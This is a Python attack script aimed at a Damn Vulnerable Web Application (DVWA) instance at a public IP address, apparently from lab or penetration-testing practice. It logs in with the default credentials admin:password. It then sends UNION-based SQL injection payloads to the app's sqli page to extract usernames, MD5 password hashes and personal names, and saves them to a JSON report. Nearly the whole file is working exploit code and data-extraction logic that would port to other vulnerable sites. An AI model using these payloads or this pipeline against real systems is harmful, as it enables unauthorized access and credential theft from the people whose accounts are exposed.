
import requests
import re
from urllib.parse import quote
import json
from datetime import datetime

session = requests.Session()
url = "http://31.97.117.123"

print("\n" + "="*120)
print("PHASE 3: COMPREHENSIVE DATA COMPILATION & ANALYSIS")
print("="*120)

# Authenticate
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=data, allow_redirects=True)

# Extract all user data with SQL injection
payload = "1' UNION SELECT CONCAT(user, '|', password, '|', user_id), CONCAT(first_name, '|', last_name) FROM users -- "
sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

# Parse the extracted data
matches = re.findall(r'First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response.text)

# Organize the data
users_data = []
for idx, (user_info, name_info) in enumerate(matches, 1):
    user_info = user_info.strip()
    name_info = name_info.strip()
    
    if '|' in user_info and '|' in name_info:
        user_parts = user_info.split('|')
        name_parts = name_info.split('|')
        
        if len(user_parts) >= 2 and len(name_parts) >= 2:
            username = user_parts[0]
            password_hash = user_parts[1]
            user_id = user_parts[2] if len(user_parts) > 2 else "N/A"
            first_name = name_parts[0]
            last_name = name_parts[1]
            
            users_data.append({
                "id": idx,
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "last_name": last_name,
                "full_name": f"{first_name} {last_name}",
                "password_hash": password_hash,
                "hash_type": "MD5",
                "status": "ACTIVE"
            })

# Alternative extraction for cleaner data
payload2 = "1' UNION SELECT user, password FROM users -- "
sqli_response2 = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload2)}&Submit=Submit")
matches2 = re.findall(r'First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response2.text)

# Create clean user data
clean_users_data = []
processed_usernames = set()

for username, password_hash in matches2:
    username = username.strip()
    password_hash = password_hash.strip()
    
    if username and password_hash and username not in processed_usernames:
        clean_users_data.append({
            "username": username,
            "password_hash": password_hash,
            "hash_type": "MD5"
        })
        processed_usernames.add(username)

print("\n[+] EXTRACTED USER DATA FROM USERS TABLE:")
print("-" * 120)

# Create comprehensive report
report_data = {
    "extraction_timestamp": datetime.now().isoformat(),
    "target": "http://31.97.117.123/",
    "application": "DVWA v1.10",
    "authentication": {
        "credentials": "admin:password",
        "attempts": 2,
        "max_attempts": 10,
        "method": "Default credentials brute force"
    },
    "vulnerability": {
        "type": "SQL Injection (UNION-Based)",
        "location": "/vulnerabilities/sqli/",
        "parameter": "id (GET)",
        "severity": "CRITICAL"
    },
    "users_count": len(clean_users_data),
    "users": clean_users_data
}

# Display formatted table
print(f"\n{'#':<3} {'Username':<15} {'Password Hash (MD5)':<40} {'Hash Type':<10}")
print("-" * 120)

for idx, user in enumerate(clean_users_data, 1):
    print(f"{idx:<3} {user['username']:<15} {user['password_hash']:<40} {user['hash_type']:<10}")

print("-" * 120)
print(f"\nTotal Users Extracted: {len(clean_users_data)}")

# Also get the combined data for names
print("\n\n[+] COMPLETE USER RECORDS WITH NAMES:")
print("-" * 120)

payload3 = "1' UNION SELECT CONCAT(user, '|||', password), CONCAT(first_name, '|||', last_name) FROM users -- "
sqli_response3 = session.get(f"{url}/vulnerabilities/sqli/?id={quote(payload3)}&Submit=Submit")
matches3 = re.findall(r'First name: ([^<]+)<br />\s*Surname: ([^<]+)</pre>', sqli_response3.text)

complete_users = []
for user_part, name_part in matches3:
    user_part = user_part.strip()
    name_part = name_part.strip()
    
    if '|||' in user_part and '|||' in name_part:
        username, password_hash = user_part.split('|||')
        first_name, last_name = name_part.split('|||')
        
        complete_users.append({
            "username": username.strip(),
            "first_name": first_name.strip(),
            "last_name": last_name.strip(),
            "password_hash": password_hash.strip(),
            "full_name": f"{first_name.strip()} {last_name.strip()}"
        })

print(f"\n{'#':<3} {'Username':<12} {'First Name':<15} {'Last Name':<15} {'Password Hash (MD5)':<40}")
print("-" * 120)

for idx, user in enumerate(complete_users, 1):
    print(f"{idx:<3} {user['username']:<12} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<40}")

print("-" * 120)
print(f"Total Records: {len(complete_users)}")

# Save to JSON
report_data["complete_users"] = complete_users
with open('/tmp/dvwa_users_extraction.json', 'w') as f:
    json.dump(report_data, f, indent=2)

print("\n[+] Report saved to: /tmp/dvwa_users_extraction.json")


